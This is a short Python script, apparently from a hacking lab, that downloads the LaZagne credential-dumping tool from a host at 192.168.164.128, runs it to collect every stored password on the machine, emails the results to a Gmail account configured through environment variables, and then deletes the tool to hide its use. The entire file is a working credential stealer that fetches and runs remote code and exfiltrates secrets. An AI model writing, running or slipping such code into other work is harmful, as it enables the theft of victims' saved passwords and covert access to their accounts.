#!/usr/bin/env/python
import requests, subprocess, smtplib, os, tempfile
from dotenv import load_dotenv

load_dotenv()

EMAIL = os.getenv("EMAIL")
PASSWORD = os.getenv("PASSWORD")


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_response.content)


tempdirectory = tempfile.gettempdir()
os.chdir(tempdirectory)
download("http://192.168.164.128/Evil_files/LaZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail(EMAIL, PASSWORD, result)
os.remove("laZagne.exe")
